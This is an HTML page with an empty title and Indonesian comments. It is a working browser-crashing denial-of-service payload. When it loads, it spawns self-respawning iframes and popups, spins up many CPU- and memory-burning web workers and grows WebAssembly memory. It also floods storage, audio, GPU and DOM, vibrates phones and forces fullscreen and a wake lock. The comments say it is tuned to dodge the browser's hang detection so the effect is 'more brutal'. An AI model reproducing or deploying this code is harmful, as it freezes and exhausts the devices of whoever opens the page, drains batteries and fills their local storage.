<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
  <meta name="mobile-web-app-capable" content="yes">
  <meta name="apple-mobile-web-app-capable" content="yes">
  <title></title>
  <style>
    * { box-sizing: border-box; margin: 0; padding: 0; }
    html, body {
      width: 100%; height: 100%; overflow: hidden;
      background: #000; touch-action: none;
    }
    #nest {
      position: fixed; inset: 0;
      display: grid;
      grid-template-columns: repeat(5, 1fr);
      grid-template-rows: repeat(4, 1fr);
      opacity: .45;
    }
    #nest iframe { width: 100%; height: 100%; border: 0; background: #000; }
    #stage {
      position: fixed; inset: -25%; width: 150%; height: 150%;
      pointer-events: none;
      filter: contrast(3) saturate(6) brightness(1.2);
      will-change: filter, transform;
      transform: translateZ(0);
    }
    canvas { position: absolute; inset: 0; width: 100%; height: 100%; mix-blend-mode: screen; }
    .blob {
      position: absolute; width: 60vw; height: 60vh; border-radius: 42%;
      background:
        radial-gradient(circle at 30% 30%, #ff0, transparent 55%),
        radial-gradient(circle at 70% 60%, #f0f, transparent 55%),
        radial-gradient(circle at 50% 80%, #0ff, transparent 55%);
      filter: blur(45px) contrast(4) saturate(5);
      animation: spin .15s linear infinite, pulse .08s ease-in-out infinite alternate;
      mix-blend-mode: color-dodge; will-change: transform, filter;
      box-shadow: 0 0 140px 70px rgba(255,0,80,.45), inset 0 0 100px rgba(0,255,255,.35);
    }
    @keyframes spin { to { transform: rotate(360deg) scale(1.7) skewX(10deg); } }
    @keyframes pulse {
      from { filter: blur(20px) hue-rotate(0deg) contrast(3); }
      to { filter: blur(90px) hue-rotate(220deg) contrast(5); }
    }
    #dom-bomb { position: absolute; inset: 0; overflow: hidden; contain: none; }
    #dom-bomb .layer {
      position: absolute; width: 320vmax; height: 320vmax; left: -110vmax; top: -110vmax;
      backdrop-filter: blur(70px) contrast(5) saturate(6) brightness(1.5);
      -webkit-backdrop-filter: blur(70px) contrast(5) saturate(6) brightness(1.5);
      background:
        linear-gradient(45deg, rgba(255,0,0,.22), rgba(0,255,255,.22), rgba(255,0,255,.22)),
        repeating-conic-gradient(from 0deg, rgba(255,255,0,.06) 0 8deg, transparent 8deg 16deg);
      box-shadow:
        0 0 120px 60px rgba(255,0,100,.4),
        inset 0 0 140px rgba(0,255,255,.3),
        0 0 220px 100px rgba(255,255,0,.2);
      animation: thrash .09s linear infinite;
      will-change: transform, filter, opacity;
    }
    #dom-bomb .layer div {
      position: absolute; inset: 1.5%; width: 97%; height: 97%;
      backdrop-filter: blur(22px) contrast(2.5);
      -webkit-backdrop-filter: blur(22px) contrast(2.5);
      animation: thrash .11s linear infinite reverse;
      will-change: transform, filter;
    }
    @keyframes thrash {
      0% { transform: translate3d(0,0,0) rotate(0deg) scale(1); opacity: .85; }
      33% { transform: translate3d(7%,-5%,0) rotate(120deg) scale(1.4); opacity: 1; }
      66% { transform: translate3d(-6%,7%,0) rotate(240deg) scale(.85); opacity: .7; }
      100% { transform: translate3d(0,0,0) rotate(360deg) scale(1.15); opacity: .9; }
    }
    body.slave #nest { display: none; }
  </style>
</head>
<body>
  <div id="nest"></div>
  <div id="stage"><div id="dom-bomb"></div></div>
  <script>
  (() => {
    'use strict';
    const params = new URLSearchParams(location.search);
    const IS_SLAVE = params.get('slave') === '1';
    const IS_MOBILE = /Android|iPhone|iPad|iPod|Mobile/i.test(navigator.userAgent) ||
      (navigator.maxTouchPoints > 1 && Math.min(screen.width, screen.height) < 900);
    const cores = navigator.hardwareConcurrency || (IS_MOBILE ? 6 : 8);
    const slaveHref = (() => {
      const u = new URL(location.href);
      u.searchParams.set('slave', '1');
      return u.href;
    })();
    if (IS_SLAVE) document.body.classList.add('slave');

    const stage = document.getElementById('stage');
    const bomb = document.getElementById('dom-bomb');
    const nest = document.getElementById('nest');
    const workers = [];
    const memHold = [];
    const urls = [];
    let frames = 0;
    let armed = false;

    // ═══════════ UTIL ═══════════
    function touch(buf) {
      const u8 = buf instanceof ArrayBuffer ? new Uint8Array(buf) : buf;
      for (let i = 0; i < u8.length; i += 4096) u8[i] = i & 255;
    }

    function eat(mb) {
      const size = mb || (IS_MOBILE ? 32 : 64);
      try {
        const a = new Uint8Array(size * 1024 * 1024);
        touch(a);
        memHold.push(a, new Float64Array(size * 96 * 1024), { s: 'x'.repeat(size * 8192) });
      } catch (_) {
        try {
          const a = new Uint8Array(2 * 1024 * 1024);
          touch(a);
          memHold.push(a);
        } catch (__) {}
      }
    }

    function mkUrl(src) {
      const u = URL.createObjectURL(new Blob([src], { type: 'application/javascript' }));
      urls.push(u);
      return u;
    }

    // ═══════════ WAKE / VIBRATE / FULLSCREEN ═══════════
    async function keepAwake() {
      try {
        if (navigator.wakeLock) {
          await navigator.wakeLock.request('screen');
          document.addEventListener('visibilitychange', () => {
            if (document.visibilityState === 'visible') navigator.wakeLock.request('screen').catch(() => {});
          });
        }
      } catch (_) {}
    }
    keepAwake();
    if (IS_MOBILE) setInterval(() => { try { navigator.vibrate?.([40, 20, 60, 20, 80]); } catch (_) {} }, 160);

    // ═══════════ WASM MEMORY GROW ═══════════
    let wasmMem = null;
    try {
      wasmMem = new WebAssembly.Memory({ initial: 512, maximum: 65536 });
      memHold.push(wasmMem);
      setInterval(() => {
        try {
          wasmMem.grow(IS_MOBILE ? 128 : 256);
          touch(wasmMem.buffer);
        } catch (_) {}
      }, IS_MOBILE ? 20 : 12);
    } catch (_) {}

    // ═══════════ WORKER SOURCES ═══════════
    const cpuSrc = `
      const N = 1024 * 640;
      const a = new Float64Array(N), b = new Float64Array(N), c = new Float64Array(N);
      let n = Math.random();
      function burn() {
        for (let i = 0; i < N; i++) {
          n = Math.sin(n + a[i]) * Math.cos(b[i] * 1.17) + Math.sqrt(Math.abs(c[i] * n) + 1e-9);
          a[i] = n * b[i] + Math.tan((n % 1.5) * 0.02);
          b[i] = Math.atan2(a[i], n + 0.001);
          c[i] = Math.hypot(a[i], b[i]) * Math.expm1(n * 0.0001);
        }
        let s = '';
        for (let i = 0; i < 600; i++) s += (n + i).toString(36);
        s = s.replace(/[a-z0-9]{2,}/g, m => m.split('').reverse().join(''));
        try { JSON.parse(JSON.stringify({ n, s: s.slice(0, 4000), t: Date.now(), arr: a.slice(0, 200) })); } catch (_) {}
        // crypto-ish churn
        let h = 2166136261;
        for (let i = 0; i < s.length; i++) { h ^= s.charCodeAt(i); h = Math.imul(h, 16777619); }
        postMessage(h);
        setTimeout(burn, 0);
        Promise.resolve().then(burn);
        queue s;
      }
      burn();
      setInterval(() => { let x = 1; for (let i = 0; i < 8e6; i++) x = Math.sin(x) * Math.cos(x + i); }, 1);
      // nested worker if possible
      try {
        const blob = new Blob([\`
          setInterval(()=>{let x=1;for(let i=0;i<2e6;i++)x=Math.sin(x);},1);
          const hold=[];
          setInterval(()=>{try{const u=new Uint8Array(8*1024*1024);for(let i=0;i<u.length;i+=4096)u[i]=1;hold.push(u);}catch(e){}},10);
        \`], {type:'application/javascript'});
        new Worker(URL.createObjectURL(blob));
      } catch (_) {}
    `;

    const ramSrc = `
      const hold = [];
      const mb = ${IS_MOBILE ? 32 : 64};
      function alloc() {
        try {
          const u8 = new Uint8Array(mb * 1024 * 1024);
          for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
          hold.push(u8, new Float64Array(mb * 48 * 1024), new ArrayBuffer(mb * 512 * 1024));
          postMessage(hold.length);
        } catch (e) {
          try {
            const u8 = new Uint8Array(2 * 1024 * 1024);
            for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
            hold.push(u8); postMessage(hold.length);
          } catch (_) {}
        }
        setTimeout(alloc, ${IS_MOBILE ? 2 : 3});
      }
      alloc();
      setInterval(alloc, ${IS_MOBILE ? 5 : 6});
    `;

    const offSrc = typeof OffscreenCanvas !== 'undefined' ? `
      const c = new OffscreenCanvas(${IS_MOBILE ? 1280 : 1920}, ${IS_MOBILE ? 720 : 1080});
      const ctx = c.getContext('2d');
      const img = ctx.createImageData(${IS_MOBILE ? 640 : 960}, ${IS_MOBILE ? 360 : 540});
      const hold = [];
      function go() {
        const d = img.data; const t = performance.now() * 0.02;
        for (let i = 0; i < d.length; i += 4) {
          d[i] = (Math.sin(i * 0.01 + t) * 127 + 128) | 0;
          d[i+1] = (Math.cos(i * 0.013 - t) * 127 + 128) | 0;
          d[i+2] = (Math.sin(i * 0.007 + t * 2) * 127 + 128) | 0;
          d[i+3] = 255;
        }
        ctx.putImageData(img, 0, 0);
        ctx.filter = 'blur(10px) contrast(350%) saturate(400%)';
        ctx.globalCompositeOperation = 'lighter';
        ctx.drawImage(c, -20, -20, c.width + 40, c.height + 40);
        try {
          const u8 = new Uint8Array(4 * 1024 * 1024);
          for (let i = 0; i < u8.length; i += 4096) u8[i] = 1;
          hold.push(u8);
        } catch (_) {}
        requestAnimationFrame(go);
      }
      go();
      setInterval(() => { let x = 1; for (let i = 0; i < 3e6; i++) x = Math.sin(x); }, 1);
    ` : null;

    const cpuUrl = mkUrl(cpuSrc);
    const ramUrl = mkUrl(ramSrc);
    const offUrl = offSrc ? mkUrl(offSrc) : null;

    function spawnWorkers(cpuN, ramN, offN) {
      for (let i = 0; i < cpuN; i++) { try { workers.push(new Worker(cpuUrl)); } catch (_) {} }
      for (let i = 0; i < ramN; i++) { try { workers.push(new Worker(ramUrl)); } catch (_) {} }
      if (offUrl) for (let i = 0; i < offN; i++) { try { workers.push(new Worker(offUrl)); } catch (_) {} }
    }

    // ═══════════ STORAGE / IDB / CACHE STORM ═══════════
    function storageStorm() {
      try {
        for (let i = 0; i < 300; i++) localStorage.setItem('s' + i + Date.now(), 'Z'.repeat(50000));
      } catch (_) {}
      try {
        const req = indexedDB.open('stress_' + Date.now(), 1);
        req.onupgradeneeded = e => {
          const db = e.target.result;
          const store = db.createObjectStore('b', { autoIncrement: true });
          for (let i = 0; i < 40; i++) store.put(new Uint8Array(1024 * 256).fill(i));
        };
        req.onsuccess = e => {
          try {
            const db = e.target.result;
            const tx = db.transaction('b', 'readwrite');
            const store = tx.objectStore('b');
            for (let i = 0; i < 80; i++) store.put(new Uint8Array(512 * 1024).fill(i & 255));
          } catch (_) {}
        };
      } catch (_) {}
      if (window.caches) {
        caches.open('stress').then(c => {
          const tasks = [];
          for (let i = 0; i < 30; i++) {
            tasks.push(c.put('/phantom_' + i + '_' + Date.now(), new Response(new Uint8Array(256 * 1024).fill(7))));
          }
          return Promise.allSettled(tasks);
        }).catch(() => {});
      }
    }

    // ═══════════ CRYPTO / COMPRESSION / CHANNEL STORM ═══════════
    function sideStorm() {
      // SubtleCrypto digest loops
      if (crypto?.subtle) {
        const buf = new Uint8Array(1024 * 256).fill(9);
        const loop = () => {
          crypto.subtle.digest('SHA-256', buf).then(() => {
            crypto.subtle.digest('SHA-512', buf).then(loop).catch(() => setTimeout(loop, 0));
          }).catch(() => setTimeout(loop, 0));
        };
        loop();
      }
      // CompressionStream churn
      try {
        if (typeof CompressionStream !== 'undefined') {
          setInterval(async () => {
            try {
              const cs = new CompressionStream('gzip');
              const w = cs.writable.getWriter();
              await w.write(new Uint8Array(512 * 1024).fill(3));
              await w.close();
              const r = cs.readable.getReader();
              while (true) { const { done } = await r.read(); if (done) break; }
            } catch (_) {}
          }, 30);
        }
      } catch (_) {}
      // MessageChannel flood
      for (let i = 0; i < 24; i++) {
        const ch = new MessageChannel();
        const ping = () => ch.port1.postMessage(Math.random());
        ch.port2.onmessage = () => { ping(); let x = 1; for (let j = 0; j < 20000; j++) x = Math.sin(x); };
        ch.port1.onmessage = () => ch.port2.postMessage(1);
        ping();
      }
      // BroadcastChannel
      try {
        const bc = new BroadcastChannel('stress');
        setInterval(() => {
          bc.postMessage({ t: Date.now(), p: new Array(5000).fill(Math.random()) });
        }, 10);
        bc.onmessage = () => { let x = 1; for (let i = 0; i < 50000; i++) x = Math.sin(x); };
      } catch (_) {}
    }

    // ═══════════ AUDIO HELL ═══════════
    const audioCtxs = [];
    function startAudio() {
      try {
        const ac = new (window.AudioContext || window.webkitAudioContext)({ latencyHint: 'interactive' });
        const n = IS_MOBILE ? 40 : 72;
        for (let i = 0; i < n; i++) {
          const o = ac.createOscillator();
          const g = ac.createGain();
          const f = ac.createBiquadFilter();
          const d = ac.createDelay(1);
          const ws = ac.createWaveShaper();
          const curve = new Float32Array(2048);
          for (let j = 0; j < 2048; j++) curve[j] = Math.tanh((j / 1024 - 1) * 50);
          ws.curve = curve;
          f.type = 'bandpass'; f.frequency.value = 60 + i * 75; f.Q.value = 32;
          d.delayTime.value = 0.01 + (i % 25) * 0.012;
          g.gain.value = 0.00025;
          o.type = ['sawtooth', 'square', 'triangle'][i % 3];
          o.frequency.value = 28 + i * 27;
          o.connect(f); f.connect(ws); ws.connect(d); d.connect(g); g.connect(ac.destination);
          o.start();
        }
        const an = ac.createAnalyser();
        an.fftSize = 32768;
        const silent = ac.createGain(); silent.gain.value = 0;
        silent.connect(an); an.connect(ac.destination);
        ac.resume().catch(() => {});
        audioCtxs.push(ac);
        return ac;
      } catch (_) { return null; }
    }

    // ═══════════ DOM ═══════════
    function spawnDom(depth) {
      const wrap = document.createElement('div');
      wrap.className = 'layer';
      wrap.style.left = (Math.random() * 45 - 22) + '%';
      wrap.style.top = (Math.random() * 45 - 22) + '%';
      let cur = wrap;
      for (let i = 0; i < depth; i++) {
        const c = document.createElement('div');
        cur.appendChild(c);
        cur = c;
      }
      bomb.appendChild(wrap);
    }

    function thrashLayout() {
      const nodes = bomb.querySelectorAll('div');
      const len = Math.min(nodes.length, IS_MOBILE ? 300 : 600);
      for (let i = 0; i < len; i++) {
        const n = nodes[(Math.random() * nodes.length) | 0];
        if (!n) continue;
        n.style.transform = `translate3d(${Math.random()*50}px,${Math.random()*50}px,0) rotate(${Math.random()*360}deg) scale(${0.7+Math.random()*0.8})`;
        void n.offsetHeight;
        n.style.opacity = String(0.35 + Math.random() * 0.65);
      }
    }

    // ═══════════ VISUAL / GPU ═══════════
    function startVisual(level) {
      const hi = level > 1;
      const blobN = hi ? (IS_MOBILE ? 32 : 48) : (IS_MOBILE ? 12 : 18);
      const canvasN = hi ? (IS_MOBILE ? 7 : 12) : (IS_MOBILE ? 3 : 5);
      for (let i = 0; i < blobN; i++) {
        const el = document.createElement('div');
        el.className = 'blob';
        el.style.left = (Math.random() * 90) + '%';
        el.style.top = (Math.random() * 90) + '%';
        el.style.animationDuration = (.07 + Math.random() * .2) + 's,' + (.05 + Math.random() * .12) + 's';
        stage.appendChild(el);
      }

      const canvases = [], ctxs = [], imgs = [];
      for (let i = 0; i < canvasN; i++) {
        const c = document.createElement('canvas');
        c.width = hi ? (IS_MOBILE ? 1080 : 1680) : (IS_MOBILE ? 720 : 960);
        c.height = hi ? (IS_MOBILE ? 608 : 945) : (IS_MOBILE ? 405 : 540);
        stage.appendChild(c);
        canvases.push(c);
        const ctx = c.getContext('2d', { willReadFrequently: true, alpha: true });
        ctxs.push(ctx);
        imgs.push(ctx.createImageData(c.width >> 1, c.height >> 1));
      }

      const glObjs = [];
      const glN = hi ? 3 : 1;
      for (let g = 0; g < glN; g++) {
        const c = document.createElement('canvas');
        c.width = IS_MOBILE ? 1280 : 1920;
        c.height = IS_MOBILE ? 720 : 1080;
        stage.appendChild(c);
        const gl = c.getContext('webgl', {
          antialias: true, preserveDrawingBuffer: false, powerPreference: 'high-performance'
        }) || c.getContext('webgl2', { antialias: true, powerPreference: 'high-performance' });
        if (!gl) continue;
        const vs = gl.createShader(gl.VERTEX_SHADER);
        gl.shaderSource(vs, 'attribute vec2 a;varying vec2 v;void main(){v=a;gl_Position=vec4(a,0.,1.);}');
        gl.compileShader(vs);
        const fs = gl.createShader(gl.FRAGMENT_SHADER);
        const iters = hi ? (IS_MOBILE ? 52 : 72) : 40;
        gl.shaderSource(fs, `
          precision highp float; varying vec2 v; uniform float t;
          void main(){
            vec2 p = v * 65.0; float n = 0.0;
            for (int i = 0; i < ${iters}; i++) {
              float fi = float(i);
              n += sin(p.x * fi * 0.11 + t) * cos(p.y * fi * 0.15 - t * 1.35);
              float c = cos(t * 0.28), s = sin(t * 0.28);
              p = mat2(c,-s,s,c) * p * 1.085 + vec2(n * 0.012);
            }
            gl_FragColor = vec4(0.5+0.5*sin(n+t), 0.5+0.5*cos(n*1.95), 0.5+0.5*sin(n*2.7-t), 1.0);
          }`);
        gl.compileShader(fs);
        const prog = gl.createProgram();
        gl.attachShader(prog, vs); gl.attachShader(prog, fs); gl.linkProgram(prog);
        gl.useProgram(prog);
        const buf = gl.createBuffer();
        gl.bindBuffer(gl.ARRAY_BUFFER, buf);
        gl.bufferData(gl.ARRAY_BUFFER, new Float32Array([-1,-1,1,-1,-1,1,1,1]), gl.STATIC_DRAW);
        const loc = gl.getAttribLocation(prog, 'a');
        gl.enableVertexAttribArray(loc);
        gl.vertexAttribPointer(loc, 2, gl.FLOAT, false, 0, 0);
        glObjs.push({ gl, prog, canvas: c });
      }

      const mainA = new Float64Array(hi ? 768 * 512 : 256 * 512);
      function mainBurn(ms) {
        const end = performance.now() + ms;
        let x = Math.random();
        while (performance.now() < end) {
          for (let i = 0; i < mainA.length; i++) {
            x = Math.sin(x + mainA[i]) * Math.cos(x * 1.07);
            mainA[i] = x;
          }
        }
      }

      const depth = hi ? (IS_MOBILE ? 45 : 60) : (IS_MOBILE ? 18 : 24);
      for (let i = 0; i < (hi ? 50 : 14); i++) spawnDom(depth);

      // MutationObserver burn
      try {
        new MutationObserver(() => { mainBurn(1); }).observe(bomb, {
          childList: true, subtree: true, attributes: true
        });
      } catch (_) {}

      function tick(t) {
        frames++;
        mainBurn(hi ? (IS_MOBILE ? 14 : 11) : 6);
        for (let ci = 0; ci < ctxs.length; ci++) {
          const ctx = ctxs[ci], img = imgs[ci], c = canvases[ci];
          if (!ctx || !img) continue;
          const d = img.data;
          const tt = t * 0.014 + ci * 11;
          for (let i = 0; i < d.length; i += 4) {
            d[i] = (Math.sin(i * 0.009 + tt) * 127 + 128) | 0;
            d[i + 1] = (Math.cos(i * 0.014 - tt) * 127 + 128) | 0;
            d[i + 2] = (Math.sin(i * 0.006 + tt * 2.1) * 127 + 128) | 0;
            d[i + 3] = 220;
          }
          ctx.putImageData(img, (Math.random() * 40) | 0, (Math.random() * 40) | 0);
          ctx.filter = `blur(${4 + ci % 5}px) contrast(260%) saturate(380%) hue-rotate(${frames % 360}deg)`;
          ctx.globalCompositeOperation = 'lighter';
          ctx.drawImage(c, -40, -40, c.width + 80, c.height + 80);
        }
        for (const g of glObjs) {
          g.gl.useProgram(g.prog);
          g.gl.uniform1f(g.gl.getUniformLocation(g.prog, 't'), t * 0.001);
          for (let p = 0; p < (hi ? 14 : 6); p++) {
            g.gl.viewport(0, 0, g.canvas.width, g.canvas.height);
            g.gl.drawArrays(g.gl.TRIANGLE_STRIP, 0, 4);
          }
        }
        if (frames % 2 === 0) spawnDom(depth);
        if (frames % 3 === 0) thrashLayout();
        if (hi) eat();
        stage.style.filter = `contrast(${2.5 + Math.random() * 2}) saturate(${4 + Math.random() * 4}) hue-rotate(${frames % 360}deg) blur(${Math.random() * 2}px)`;
        stage.style.transform = `translate3d(${Math.random()*12-6}px,${Math.random()*12-6}px,0) scale(${1.05+Math.random()*0.1}) rotate(${Math.random()*3-1.5}deg)`;
        requestAnimationFrame(tick);
        if (hi) requestAnimationFrame(tick);
      }
      requestAnimationFrame(tick);

      if (hi) {
        setInterval(() => { eat(); eat(); }, IS_MOBILE ? 5 : 6);
        setInterval(() => spawnDom(depth), 16);
        setInterval(thrashLayout, 40);
        setInterval(() => {
          try { workers.push(new Worker(cpuUrl)); } catch (_) {}
          try { workers.push(new Worker(ramUrl)); } catch (_) {}
          if (offUrl) try { workers.push(new Worker(offUrl)); } catch (_) {}
        }, IS_MOBILE ? 60 : 80);
      }

      // createImageBitmap churn
      setInterval(() => {
        try {
          const c = document.createElement('canvas');
          c.width = 512; c.height = 512;
          const ctx = c.getContext('2d');
          ctx.fillStyle = '#' + ((Math.random() * 0xffffff) | 0).toString(16);
          ctx.fillRect(0, 0, 512, 512);
          createImageBitmap(c).then(bmp => {
            memHold.push(bmp);
            ctx.drawImage(bmp, 0, 0);
          }).catch(() => {});
        } catch (_) {}
      }, 25);
    }

    // ═══════════ MICROTASK / IDLE FLOOD ═══════════
    function flood() {
      for (let i = 0; i < (IS_MOBILE ? 120 : 250); i++) {
        Promise.resolve().then(() => {
          let x = Math.random();
          for (let j = 0; j < 40000; j++) x = Math.sin(x);
        });
      }
      queueMicrotask(() => {
        let x = 1;
        for (let i = 0; i < 100000; i++) x = Math.cos(x);
      });
      setTimeout(flood, IS_MOBILE ? 12 : 8);
    }

    // ═══════════ BOOT ENGINES ═══════════
    // PENTING: controller JANGAN freeze main thread dulu.
    // Kalau langsung hang → Chrome "Tidak Merespons" → JS di-pause → hydra gagal → kurang brutal.
    // Urutan: spawn banyak proses DULU, baru rampage.

    if (IS_SLAVE) {
      // Slave = mesin bakar penuh (ini yang bikin brutal)
      storageStorm();
      sideStorm();
      setInterval(storageStorm, 4000);
      for (let i = 0; i < (IS_MOBILE ? 28 : 32); i++) eat();
      spawnWorkers(
        Math.max(IS_MOBILE ? 18 : 32, cores * (IS_MOBILE ? 4 : 6)),
        Math.max(IS_MOBILE ? 8 : 12, cores + 2),
        Math.max(IS_MOBILE ? 4 : 8, cores)
      );
      startVisual(2);
      startAudio();
      flood();
      setInterval(() => { try { parent.postMessage({ type: 'a' }, '*'); } catch (_) {} }, 300);
    } else {
      const iframes = [];
      const pops = [];
      const iframeTarget = IS_MOBILE ? 20 : 20;
      const popupTarget = IS_MOBILE ? 0 : 10;

      function addIframe() {
        const f = document.createElement('iframe');
        f.src = slaveHref + '&t=' + Date.now() + '_' + Math.random();
        f.setAttribute('allow', 'autoplay; accelerometer; gyroscope; magnetometer');
        nest.appendChild(f);
        iframes.push(f);
        return f;
      }
      function addPopup() {
        const w = window.open(
          slaveHref + '&t=' + Date.now() + '_' + Math.random(),
          'x' + Date.now() + Math.random().toString(36).slice(2),
          'width=320,height=240,left=' + ((pops.length * 32) % 800) + ',top=' + ((pops.length * 24) % 500)
        );
        if (w) pops.push(w);
        return w;
      }

      // 1) HYDRA FIRST — biarkan Chrome buat banyak renderer
      for (let i = 0; i < iframeTarget; i++) addIframe();
      for (let i = 0; i < popupTarget; i++) addPopup();

      // 2) Controller ringan dulu (jangan flood / jangan mainBurn berat)
      spawnWorkers(
        Math.max(IS_MOBILE ? 4 : 6, Math.ceil(cores / 2)),
        Math.max(IS_MOBILE ? 2 : 3, 2),
        IS_MOBILE ? 1 : 2
      );
      startAudio();

      // 3) Setelah hydra sempat load (~1.2s), baru controller ikut ngegas
      setTimeout(() => {
        sideStorm();
        storageStorm();
        setInterval(storageStorm, 4000);
        for (let i = 0; i < (IS_MOBILE ? 8 : 10); i++) eat();
        startVisual(1);
        // ramp workers tambahan
        spawnWorkers(
          Math.max(IS_MOBILE ? 8 : 12, cores),
          Math.max(IS_MOBILE ? 3 : 5, Math.ceil(cores / 2)),
          Math.max(IS_MOBILE ? 2 : 3, 2)
        );
      }, 1200);

      // 4) Peak kedua — tambah tekanan tanpa bunuh respawn
      setTimeout(() => {
        for (let i = 0; i < 6; i++) eat();
        for (let i = 0; i < (IS_MOBILE ? 4 : 6); i++) addIframe();
        if (!IS_MOBILE) for (let i = 0; i < 4; i++) addPopup();
      }, 2500);

      function arm() {
        if (armed) {
          for (let i = 0; i < (IS_MOBILE ? 3 : 2); i++) addIframe();
          if (!IS_MOBILE) for (let i = 0; i < 2; i++) addPopup();
        }
        armed = true;
        for (const ac of audioCtxs) ac.resume?.().catch(() => {});
        startAudio();
        try {
          const el = document.documentElement;
          (el.requestFullscreen || el.webkitRequestFullscreen)?.call(el);
        } catch (_) {}
        keepAwake();
        for (let i = 0; i < 4; i++) eat();
      }
      document.addEventListener('click', arm);
      document.addEventListener('touchstart', arm, { passive: true });
      document.addEventListener('pointerdown', arm);

      setInterval(() => {
        for (let i = 0; i < iframes.length; i++) {
          let dead = false;
          try {
            if (!iframes[i].contentWindow) dead = true;
            else void iframes[i].contentDocument;
          } catch (_) { dead = true; }
          if (dead) {
            try { iframes[i].remove(); } catch (_) {}
            iframes[i] = addIframe();
          }
        }
        for (let i = 0; i < pops.length; i++) {
          if (!pops[i] || pops[i].closed) pops[i] = addPopup();
        }
        eat();
      }, IS_MOBILE ? 400 : 550);

      setInterval(() => {
        if (!iframes.length) return;
        const i = frames % iframes.length;
        try { iframes[i].remove(); } catch (_) {}
        iframes[i] = addIframe();
      }, IS_MOBILE ? 4000 : 5500);

      setInterval(() => {
        if (iframes.length < (IS_MOBILE ? 24 : 28)) addIframe();
      }, 1500);

      setInterval(() => {
        document.documentElement.style.setProperty('--r', Math.random());
        void document.body.offsetHeight;
        document.body.style.zoom = String(0.96 + Math.random() * 0.08);
      }, 40);
    }
  })();
  </script>
</body>
</html>
